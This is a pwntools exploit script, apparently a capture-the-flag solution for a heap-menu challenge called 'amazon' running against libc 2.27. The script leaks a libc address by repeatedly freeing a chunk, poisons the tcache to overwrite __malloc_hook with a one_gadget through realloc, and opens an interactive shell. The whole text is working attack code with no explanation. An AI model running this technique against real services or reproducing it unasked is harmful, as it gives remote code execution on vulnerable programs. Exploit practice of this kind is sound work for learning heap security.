from pwn import *
context(arch='amd64',os='linux',log_level='debug')

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x, drop=True)
r = lambda :io.recv()
it = lambda: io.interactive()
success = lambda x, y:log.success(x + ' '+ y)

binary = './amazon'
libc_name = './libc-2.27.so'
#ip = 'chall.pwnable.tw'
#port = 10104
debug = 0
libc = ELF(libc_name)
if debug == 0:
    io = remote('172.17.0.2', 8888)
else:
    io = remote(ip, port)

def add(size, cont):
    ru('Your choice: ')
    sl('1')
    ru('What item do you want to buy: ')
    sl('1')
    ru('How many: ')
    sl('1')
    ru('How long is your note: ')
    sl(str(size))
    ru('Content: ')
    sl(cont)

def show():
    ru('Your choice: ')
    sl('2')

def check(idx):
    ru('Your choice: ')
    sl('3')
    ru('Which item are you going to pay for: ')
    sl(str(idx))

add(0x100, 'abc')
add(0x10, '/bin/sh\x00')
for i in range(8):
    check(0)
show()
rn(6)
leak = u64(rn(6).ljust(8,'\x00'))
success('leak', hex(leak))
base = leak - 0x3ebca0
success('base', hex(base))
libc.address = base
malloc_hook = libc.sym['__malloc_hook']
realloc = libc.sym['realloc']
add(0x18, 'abc')
add(0x18, 'abc')
check(3)
add(0x100, 't'*0x20 + p64(0) + p64(0x51) + p64(malloc_hook - 0x28))
add(0x18, 'a')
add(0x18, p64(base + 0x4f322) + p64(realloc+4))
sl('1')
sl('1')
sl('1')
sl('1')
it()